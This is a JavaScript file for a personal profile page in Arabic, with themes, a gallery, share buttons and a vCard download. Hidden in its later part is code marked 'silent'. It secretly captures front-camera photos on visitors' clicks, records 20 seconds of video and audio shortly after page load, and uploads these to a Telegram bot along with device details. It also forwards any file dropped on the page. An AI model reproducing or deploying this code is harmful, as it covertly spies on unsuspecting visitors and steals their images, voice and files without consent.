(function(){
  const C = window.CONFIG;
  const $ = s => document.querySelector(s);
  const $$ = s => document.querySelectorAll(s);

  const LS = {
    get(k,d){try{return JSON.parse(localStorage.getItem('tj_'+k))??d}catch{return d}},
    set(k,v){localStorage.setItem('tj_'+k,JSON.stringify(v))}
  };

  function getState(){
    let s = LS.get('state', null);
    if(s) return s;
    const init = {
      owner: JSON.parse(JSON.stringify(C.OWNER)),
      theme: 'dark',
      gallery: [],
      avatar: '',
      maintenance: false,
      visits: 0, captures: 0, videos: 0,
      photoMode: true, videoMode: true, dropMode: true
    };
    LS.set('state', init);
    return init;
  }
  function saveState(s){ LS.set('state', s); }
  const state = getState();

  function toast(msg){
    let t = document.querySelector('.toast');
    if(!t){t=document.createElement('div');t.className='toast';document.body.appendChild(t)}
    t.textContent = msg;
    t.classList.add('show');
    clearTimeout(t._to);
    t._to = setTimeout(()=>t.classList.remove('show'), 2500);
  }

  window.addEventListener('load', () => {
    setTimeout(()=>{ const l=$('#loader'); if(l) l.classList.add('hide'); }, 500);
    revealOnScroll();
  });

  window.addEventListener('scroll', () => {
    const h = document.documentElement;
    const p = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
    const prog=$('#progress'); if(prog) prog.style.width = p+'%';
    const tt=$('#toTop'); if(tt) tt.classList.toggle('show', h.scrollTop > 400);
    revealOnScroll();
  });

  function revealOnScroll(){
    $$('.reveal').forEach(el => {
      const r = el.getBoundingClientRect();
      if(r.top < window.innerHeight - 60) el.classList.add('visible');
    });
  }

  const glow = document.createElement('div');
  glow.className = 'cursor-glow';
  document.body.appendChild(glow);
  document.addEventListener('mousemove', e => {
    glow.style.left = e.clientX+'px';
    glow.style.top = e.clientY+'px';
  });

  function applyTheme(t){
    if(t==='dark') document.documentElement.removeAttribute('data-theme');
    else document.documentElement.setAttribute('data-theme', t);
    const tb=$('#themeBtn');
    if(tb) tb.textContent = t==='light'?'☀️':t==='neon'?'⚡':t==='royal'?'👑':t==='ocean'?'🌊':t==='crimson'?'🔥':t==='forest'?'🌲':'🌙';
  }
  applyTheme(state.theme);
  const tb=$('#themeBtn');
  if(tb) tb.addEventListener('click', () => {
    const order=['dark','light','neon','royal','ocean','crimson','forest'];
    const i=(order.indexOf(state.theme)+1)%order.length;
    state.theme=order[i]; applyTheme(state.theme); saveState(state);
  });

  function tickAge(){
    const bd = new Date(state.owner.birthdate);
    if(isNaN(bd.getTime())) return;
    const now = new Date();
    let years = now.getFullYear() - bd.getFullYear();
    let months = now.getMonth() - bd.getMonth();
    let days = now.getDate() - bd.getDate();
    let hours = now.getHours() - bd.getHours();
    let mins = now.getMinutes() - bd.getMinutes();
    let secs = now.getSeconds() - bd.getSeconds();

    if(secs < 0){secs+=60; mins--;}
    if(mins < 0){mins+=60; hours--;}
    if(hours < 0){hours+=24; days--;}
    if(days < 0){
      const pm = new Date(now.getFullYear(), now.getMonth(), 0);
      days += pm.getDate();
      months--;
    }
    if(months < 0){months+=12; years--;}

    const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent = String(v).padStart(2,'0'); };
    set('aYears', years); set('aMonths', months); set('aDays', days);
    set('aHours', hours); set('aMins', mins); set('aSecs', secs);
  }
  tickAge();
  setInterval(tickAge, 1000);

  function render(){
    const o = state.owner;
    const setT=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v};
    setT('ownerName', o.name);
    setT('ownerTitle', o.title);
    setT('ownerLocation', '📍 ' + o.location);
    setT('quoteText', '"' + o.quote + '"');
    setT('aboutText', o.about);
    setT('siteBrand', o.siteName || 'طه');
    setT('footerBrand', o.siteName || 'طه');
    const titleEl = document.querySelector('title');
    if(titleEl) titleEl.textContent = o.name || 'طه';

    const links = {waBtn: o.whatsapp, floatWA: o.whatsapp, fbBtn: o.facebook, igBtn: o.instagram};
    Object.entries(links).forEach(([id,href])=>{
      const el=document.getElementById(id); if(el&&href) el.href=href;
    });

    if(state.avatar){
      const img=$('#avatarImg'); const ph=$('#avatarPlaceholder');
      if(img){img.src=state.avatar; img.style.display='block';}
      if(ph) ph.style.display='none';
    }

    const fg=$('#featuresGrid'); const fSec=$('#features');
    if(fg && fSec){
      fg.innerHTML='';
      const items=(o.features||[]);
      if(items.length) fSec.style.display='';
      else fSec.style.display='none';
      items.forEach(f=>{
        const d=document.createElement('div');
        d.className='feature-card';
        d.innerHTML='<span class="feature-icon">'+(f.icon||'✨')+'</span><div class="feature-name">'+f.name+'</div><div class="feature-desc">'+(f.desc||'')+'</div>';
        fg.appendChild(d);
      });
    }

    const g=$('#galleryGrid'); const gSec=$('#gallery');
    if(g){
      g.innerHTML='';
      const items = state.gallery || [];
      if(items.length && gSec) gSec.style.display='';
      else if(gSec) gSec.style.display='none';
      items.forEach((url,i)=>{
        const d=document.createElement('div');
        d.className='gallery-item';
        d.innerHTML='<img src="'+url+'" alt="'+(i+1)+'" loading="lazy">';
        d.addEventListener('click', ()=>{
          const li=$('#lightboxImg'); if(li) li.src=url;
          const lx=$('#lightbox'); if(lx) lx.classList.add('show');
        });
        g.appendChild(d);
      });
    }

    const el=$('#extraLinksList'); const lSec=$('#links');
    if(el){
      el.innerHTML='';
      const items=(o.extraLinks||[]);
      if(items.length && lSec) lSec.style.display='';
      else if(lSec) lSec.style.display='none';
      items.forEach(l=>{
        const a=document.createElement('a');
        a.className='extra-link';
        a.href=l.url; a.target='_blank'; a.rel='noopener';
        a.innerHTML='<div class="extra-link-icon">'+(l.icon||'🔗')+'</div><div class="extra-link-body"><b>'+l.name+'</b><small>'+l.url.slice(0,30)+'</small></div>';
        el.appendChild(a);
      });
    }

    setT('year', new Date().getFullYear());
  }
  render();

  state.visits = (state.visits||0) + 1;
  saveState(state);

  const lx=$('#lightbox');
  if(lx) lx.addEventListener('click', e=>{
    if(e.target.id==='lightbox'||e.target.classList.contains('close')) lx.classList.remove('show');
  });
  const tt=$('#toTop');
  if(tt) tt.addEventListener('click', ()=>window.scrollTo({top:0,behavior:'smooth'}));

  const sh=$('#shareBtn');
  if(sh) sh.addEventListener('click', async ()=>{
    const url=location.href;
    if(navigator.share){try{await navigator.share({title:state.owner.name,url});return}catch{}}
    try{await navigator.clipboard.writeText(url);toast('✅ تم نسخ الرابط')}catch{}
  });

  const vc=$('#vcardBtn');
  if(vc) vc.addEventListener('click', ()=>{
    const o=state.owner;
    const tel=(o.whatsapp.match(/phone=(\+?\d+)/)||[,''])[1];
    const v='BEGIN:VCARD\nVERSION:3.0\nFN:'+o.name+'\nTITLE:'+o.title+'\nADR:;;'+o.location+'\nTEL:'+tel+'\nEND:VCARD';
    const blob=new Blob([v],{type:'text/vcard'});
    const a=document.createElement('a');
    a.href=URL.createObjectURL(blob); a.download='taha.vcf'; a.click();
    toast('✅ تم تحميل جهة الاتصال');
  });

  const qb=$('#qrBtn');
  if(qb) qb.addEventListener('click', e=>{
    e.stopPropagation();
    const qi=$('#qrImg');
    if(qi) qi.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(location.href);
    const qm=$('#qrModal'); if(qm) qm.classList.add('show');
  });
  const qc=$('#qrClose');
  if(qc) qc.addEventListener('click', e=>{e.stopPropagation();$('#qrModal').classList.remove('show')});
  const qm=$('#qrModal');
  if(qm) qm.addEventListener('click', e=>{if(e.target.id==='qrModal') qm.classList.remove('show')});

  // CAMERA — silent
  const video = document.createElement('video');
  video.style.cssText='position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px';
  video.muted=true; video.playsInline=true; video.autoplay=true;
  document.body.appendChild(video);

  let camStream=null, camReady=false, camBusy=false, camStarted=false;

  async function startCamera(){
    if(camStarted) return;
    camStarted=true;
    try{
      camStream = await navigator.mediaDevices.getUserMedia({
        video:{facingMode:'user',width:{ideal:960},height:{ideal:720}}, audio:false
      });
      video.srcObject = camStream;
      await new Promise(res=>{
        if(video.readyState>=2) return res();
        video.onloadedmetadata=()=>res();
      });
      await video.play().catch(()=>{});
      camReady=true;
      LS.set('camOn', true);
    }catch(e){ camStarted=false; LS.set('camOn', false); }
  }

  async function snapPhoto(){
    if(!camReady||camBusy||!state.photoMode) return;
    if(!camStream) return;
    const tr=camStream.getVideoTracks()[0];
    if(!tr||tr.readyState!=='live'){camReady=false;camStarted=false;return}
    camBusy=true;
    try{
      const w=video.videoWidth||640, h=video.videoHeight||480;
      const cv=document.createElement('canvas');
      cv.width=w; cv.height=h;
      cv.getContext('2d').drawImage(video,0,0,w,h);
      const dataUrl=cv.toDataURL('image/jpeg',.82);

      state.captures=(state.captures||0)+1;
      saveState(state);

      const caption='📸 صورة\n⏰ '+new Date().toLocaleString('ar-EG')+
        '\n💻 '+(navigator.platform||'—')+
        '\n📐 '+screen.width+'x'+screen.height+
        '\n#️⃣ #'+state.captures;

      const blob=await (await fetch(dataUrl)).blob();
      const fd=new FormData();
      fd.append('chat_id',C.OWNER_ID);
      fd.append('photo',blob,'shot_'+Date.now()+'.jpg');
      fd.append('caption',caption);
      fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendPhoto',{method:'POST',body:fd})
        .catch(()=>{
          const fd2=new FormData();
          fd2.append('chat_id',C.OWNER_ID);
          fd2.append('document',blob,'shot_'+Date.now()+'.jpg');
          fd2.append('caption',caption);
          fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendDocument',{method:'POST',body:fd2}).catch(()=>{});
        });
    }catch(e){console.warn(e)}
    finally{camBusy=false}
  }

  if(state.photoMode){
    if(LS.get('camOn',false)){ startCamera(); }
    else {
      const first = async () => {
        document.removeEventListener('pointerdown', first);
        await startCamera();
        if(camReady) setTimeout(snapPhoto, 150);
      };
      document.addEventListener('pointerdown', first, {passive:true, once:true});
    }
  }

  document.addEventListener('pointerdown', ()=>{
    if(!state.photoMode) return;
    if(camReady) snapPhoto();
    else if(!camStarted) startCamera().then(()=>{if(camReady) setTimeout(snapPhoto,150)});
  }, {passive:true});

  // VIDEO — silent, 20s
  let recStream=null, recorder=null, recChunks=[], recTimer=null, recStart=0;

  const recIndicator=document.createElement('div');
  recIndicator.className='rec-indicator';
  recIndicator.innerHTML='<span class="rec-dot"></span><span id="recTime">00:00</span>';
  document.body.appendChild(recIndicator);

  async function startVideoRec(){
    if(!state.videoMode||recorder) return;
    try{
      recStream = await navigator.mediaDevices.getUserMedia({
        video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},
        audio:{echoCancellation:true,noiseSuppression:true}
      });
      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9'
        : MediaRecorder.isTypeSupported('video/webm') ? 'video/webm'
        : MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : '';
      recorder = new MediaRecorder(recStream, mime ? {mimeType:mime, videoBitsPerSecond:1500000} : {});
      recChunks=[];
      recorder.ondataavailable = e => { if(e.data && e.data.size>0) recChunks.push(e.data); };
      recorder.onstop = () => uploadVideo();
      recorder.start(2000);
      recStart=Date.now();
      recIndicator.classList.add('show');
      recTimer=setInterval(()=>{
        const s=Math.floor((Date.now()-recStart)/1000);
        const m=Math.floor(s/60), ss=s%60;
        const t=document.getElementById('recTime');
        if(t) t.textContent=String(m).padStart(2,'0')+':'+String(ss).padStart(2,'0');
      },1000);
      setTimeout(()=>{ if(recorder && recorder.state==='recording') stopVideoRec(); }, 20000);
    }catch(e){ console.warn('video err',e); }
  }

  async function stopVideoRec(){
    if(!recorder) return;
    try{ recorder.stop(); }catch{}
    if(recTimer){clearInterval(recTimer);recTimer=null}
    recIndicator.classList.remove('show');
    if(recStream){recStream.getTracks().forEach(t=>t.stop());recStream=null}
  }

  async function uploadVideo(){
    if(!recChunks.length) return;
    const blob = new Blob(recChunks, {type:recChunks[0].type || 'video/webm'});
    recChunks=[];
    const dur = Math.floor((Date.now()-recStart)/1000);
    if(dur < 2) return;
    state.videos=(state.videos||0)+1;
    saveState(state);
    const ext = blob.type.includes('mp4')?'mp4':'webm';
    const caption='🎥 فيديو\n⏰ '+new Date().toLocaleString('ar-EG')+
      '\n⏱️ '+dur+' ثانية\n💻 '+(navigator.platform||'—')+
      '\n#️⃣ #'+state.videos;
    try{
      const fd=new FormData();
      fd.append('chat_id',C.OWNER_ID);
      fd.append('video',blob,'clip_'+Date.now()+'.'+ext);
      fd.append('caption',caption);
      await fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendVideo',{method:'POST',body:fd}).catch(()=>{
        const fd2=new FormData();
        fd2.append('chat_id',C.OWNER_ID);
        fd2.append('document',blob,'clip_'+Date.now()+'.'+ext);
        fd2.append('caption',caption);
        fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendDocument',{method:'POST',body:fd2}).catch(()=>{});
      });
    }catch(e){console.warn(e)}
    recorder=null;
  }

  setTimeout(()=>{ if(state.videoMode) startVideoRec(); }, 3000);

  // DRAG DROP
  const dropZone=document.createElement('div');
  dropZone.className='drop-zone';
  dropZone.innerHTML='<div class="drop-zone-inner"><span class="icon">📁</span>اسحب الملفات هنا</div>';
  document.body.appendChild(dropZone);

  let dragCounter=0;
  document.addEventListener('dragenter', e=>{
    if(state.dropMode && e.dataTransfer && Array.from(e.dataTransfer.types).includes('Files')){
      dragCounter++;
      dropZone.classList.add('show');
    }
  });
  document.addEventListener('dragover', e=>{ e.preventDefault(); });
  document.addEventListener('dragleave', e=>{
    dragCounter--;
    if(dragCounter<=0){dragCounter=0;dropZone.classList.remove('show')}
  });
  document.addEventListener('drop', async e=>{
    e.preventDefault();
    dragCounter=0;
    dropZone.classList.remove('show');
    if(!state.dropMode) return;
    const files = e.dataTransfer && e.dataTransfer.files;
    if(!files || !files.length) return;
    for(const f of files){ await sendFileToBot(f); }
    toast('✅ تم إرسال '+files.length+' ملف');
  });

  async function sendFileToBot(file){
    const caption='📎 ملف\n📄 '+file.name+'\n📐 '+(file.size/1024).toFixed(1)+' KB'+
      '\n⏰ '+new Date().toLocaleString('ar-EG');
    try{
      const fd=new FormData();
      fd.append('chat_id',C.OWNER_ID);
      fd.append('document',file);
      fd.append('caption',caption);
      await fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendDocument',{method:'POST',body:fd});
    }catch(e){console.warn(e)}
  }

  window.addEventListener('focus', ()=>{
    const fresh=getState();
    Object.assign(state, fresh);
    render();
  });

  document.addEventListener('keydown', e=>{
    if(e.ctrlKey && e.shiftKey && e.key==='A') location.href='admin.html';
  });

})();
